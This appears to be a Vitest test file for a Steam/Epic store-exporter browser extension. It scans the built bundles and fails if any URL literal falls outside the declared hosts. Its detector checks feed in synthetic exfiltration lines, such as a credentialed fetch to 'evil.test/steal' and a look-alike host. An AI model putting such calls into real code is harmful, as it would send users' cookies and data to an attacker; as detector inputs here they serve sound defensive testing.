/**
 * steam-preferences Story 2.1, AC5 — "nothing is transmitted beyond the envelope". The only outbound
 * network calls in the whole project are the adapter's two GETs to `https://store.steampowered.com/…`
 * (AC4's `hostPermissions`, computed into `manifestHostPermissions()`).
 *
 * Scans the BUILT bundles (`dist/extensions/store-exporter/{chrome,firefox}/background.js`), not the
 * source tree — a source-tree scan cannot see code pulled in from a bundled dependency, and AC5's own
 * text names "the built bundle" (2026-09-03 review finding P0-3). Every `http(s)://`/`ws(s)://`
 * literal found ANYWHERE in the emitted bundle is checked against the adapters' declared hosts, not
 * only literals sitting in a `fetch(...)`/`.send(...)` call's first-argument position — so
 * `XMLHttpRequest.open(method, url)` and a target assembled outside the call itself are both visible
 * to this scan, which a call-argument-shaped regex structurally cannot see.
 *
 * `beforeAll` builds both bundles in-process (`buildTarget`, from `../build`) rather than relying on
 * Nx's `build` → `test` task ordering: the whole-repo aggregate (`npm run test:vitest`) runs this
 * Vitest project directly via `vitest.workspace.ts`'s glob, bypassing the Nx task graph entirely, so
 * a `dependsOn: ['build']` in `project.json` would do nothing there. The same `beforeAll` also proves
 * the P0-2 fix: an unattended build (no `STORE_EXPORTER_CHANNEL` set) must emit the release-channel
 * marker, never the dev one.
 */
import { describe, it, expect, beforeAll } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { manifestHostPermissions } from './adapters';
import { EXTENSION_VERSION } from './manifest.config';
import { buildTarget, DIST_ROOT, resolveChannel } from '../build';

const ALLOWED_HOSTS = new Set(manifestHostPermissions().map((permission) => new URL(permission).host));

/**
 * Hosts that legitimately appear as string literals in the built bundle for reasons OTHER than an
 * outbound network call, verified by manual inspection during the 2026-09-03 review: `subtails.com`
 * is `subtails-origins.ts`'s release-channel allow-list entry (an origin-comparison value, never a
 * `fetch`/`XHR`/`sendBeacon`/`WebSocket` target), and `json-schema.org` is zod's own inert schema
 * identifier string, bundled in but never dereferenced.
 */
const KNOWN_BENIGN_HOSTS = new Set(['subtails.com', 'json-schema.org']);

/** Any `http(s)://` or `ws(s)://` literal string, wherever it sits in the bundle text. */
const URL_LITERAL_RE = /['"`](https?:\/\/[^'"`\s]+|wss?:\/\/[^'"`\s]+)['"`]/g;

function findOffendingHosts(bundle: string, label: string): string[] {
	const offenders: string[] = [];
	const re = new RegExp(URL_LITERAL_RE);
	let match: RegExpExecArray | null;
	while ((match = re.exec(bundle)) !== null) {
		let host: string;
		try {
			host = new URL(match[1]).host;
		} catch {
			continue;
		}
		if (!ALLOWED_HOSTS.has(host) && !KNOWN_BENIGN_HOSTS.has(host)) offenders.push(`${label}: ${match[1]}`);
	}
	return offenders;
}

let chromeBundle = '';
let chromeContentScript = '';
let firefoxContentScript = '';
let firefoxBundle = '';

beforeAll(async () => {
	// Simulate the unattended build this bug actually shipped from: no channel env var set at all.
	delete process.env.STORE_EXPORTER_CHANNEL;
	await buildTarget('chrome');
	await buildTarget('firefox');
	chromeBundle = readFileSync(join(DIST_ROOT, 'chrome', 'background.js'), 'utf8');
	firefoxBundle = readFileSync(join(DIST_ROOT, 'firefox', 'background.js'), 'utf8');
	chromeContentScript = readFileSync(join(DIST_ROOT, 'chrome', 'content.js'), 'utf8');
	firefoxContentScript = readFileSync(join(DIST_ROOT, 'firefox', 'content.js'), 'utf8');
}, 30000);

describe('outbound network surface (steam-preferences Story 2.1, AC5)', () => {
	it("the adapters' declared origins are non-empty (a vacuous allow-list would make this test a no-op)", () => {
		expect(ALLOWED_HOSTS.size).toBeGreaterThan(0);
	});

	it('sanity: the built Chrome bundle actually contains the real Steam call target (a bundle that lost it would make the scan below vacuous)', () => {
		expect(chromeBundle).toContain('store.steampowered.com');
	});

	it('sanity: the built Chrome bundle contains the Epic order-history call target', () => {
		expect(chromeBundle).toContain('accounts.epicgames.com/account/v2/payment/ajaxGetOrderHistory');
	});

	it('the allowed hosts are exactly the Steam and Epic hosts (a Steam-only union would make the Epic target an offender)', () => {
		expect([...ALLOWED_HOSTS].sort()).toEqual(['accounts.epicgames.com', 'store.steampowered.com']);
	});

	it("every http(s)/ws(s) literal in the built Chrome bundle is within the adapters' declared origins", () => {
		const offenders = findOffendingHosts(chromeBundle, 'chrome/background.js');
		expect(offenders, `Disallowed network target(s): ${offenders.join(', ')}`).toEqual([]);
	});

	it("every http(s)/ws(s) literal in the built Firefox bundle is within the adapters' declared origins", () => {
		const offenders = findOffendingHosts(firefoxBundle, 'firefox/background.js');
		expect(offenders, `Disallowed network target(s): ${offenders.join(', ')}`).toEqual([]);
	});

	it('the content script on subtails pages makes no network call and names no host (spec-epic-ownership story 5)', () => {
		for (const script of [chromeContentScript, firefoxContentScript]) {
			expect(script).toContain('subtails-visit');
			expect(script).not.toMatch(/\bfetch\s*\(|XMLHttpRequest|sendBeacon|WebSocket|https?:\/\//);
		}
	});

	it('sanity: the detector bites a synthetic disallowed target (a no-op detector proves nothing)', () => {
		expect(findOffendingHosts(`fetch('https://evil.test/steal', { credentials: 'include' })`, 'synthetic')).toEqual([
			'synthetic: https://evil.test/steal',
		]);
	});

	it('catches a target that is not in call-argument position (e.g. XMLHttpRequest.open with a pre-built URL) — the exact shape the old source-only, call-argument-only scan could not see', () => {
		const offenders = findOffendingHosts(`const u = 'https://evil.test/x'; xhr.open('GET', u);`, 'synthetic');
		expect(offenders).toEqual(['synthetic: https://evil.test/x']);
	});

	it("KNOWN_BENIGN_HOSTS is a narrow, exact allow-list, never a wildcard — it does not swallow a look-alike host", () => {
		expect(findOffendingHosts(`fetch('https://subtails.com.evil.test/x')`, 'synthetic')).toEqual([
			'synthetic: https://subtails.com.evil.test/x',
		]);
	});
});

describe('build channel default (steam-preferences Story 2.1, AC6 — P0-2 regression guard)', () => {
	it("resolveChannel defaults to 'release' when STORE_EXPORTER_CHANNEL is unset or anything other than 'dev'", () => {
		expect(resolveChannel({})).toBe('release');
		expect(resolveChannel({ STORE_EXPORTER_CHANNEL: '' })).toBe('release');
		expect(resolveChannel({ STORE_EXPORTER_CHANNEL: 'release' })).toBe('release');
		expect(resolveChannel({ STORE_EXPORTER_CHANNEL: 'nonsense' })).toBe('release');
	});

	it("resolveChannel returns 'dev' only when explicitly opted in", () => {
		expect(resolveChannel({ STORE_EXPORTER_CHANNEL: 'dev' })).toBe('dev');
	});

	it('an unattended build (no STORE_EXPORTER_CHANNEL set) is byte-identical to an explicit release build, and differs from an explicit dev build', async () => {
		// A textual search for a "release"/"dev" marker string in the bundle is unreliable: an
		// unrelated literal (`adapters/steam.ts`'s own `producerRelease()` fallback, ALSO the string
		// `'dev'`) already appears in every bundle regardless of channel. Comparing the actual emitted
		// bytes across three real builds proves the property directly instead.
		try {
			delete process.env.STORE_EXPORTER_CHANNEL;
			await buildTarget('chrome');
			const defaultBundle = readFileSync(join(DIST_ROOT, 'chrome', 'background.js'), 'utf8');

			process.env.STORE_EXPORTER_CHANNEL = 'release';
			await buildTarget('chrome');
			const releaseBundle = readFileSync(join(DIST_ROOT, 'chrome', 'background.js'), 'utf8');

			process.env.STORE_EXPORTER_CHANNEL = 'dev';
			await buildTarget('chrome');
			const devBundle = readFileSync(join(DIST_ROOT, 'chrome', 'background.js'), 'utf8');

			expect(defaultBundle).toBe(releaseBundle);
			expect(defaultBundle).not.toBe(devBundle);
		} finally {
			// Leave the shared on-disk artifact in the same (unattended-default) state this suite found
			// it in, for anyone inspecting `dist/` afterwards (e.g. Task 9's manual load-unpacked step).
			delete process.env.STORE_EXPORTER_CHANNEL;
			await buildTarget('chrome');
		}
	});

	it(`the release string carries the manifest version (${EXTENSION_VERSION})`, () => {
		expect(chromeBundle).toContain(`store-exporter.v${EXTENSION_VERSION}`);
	});
});
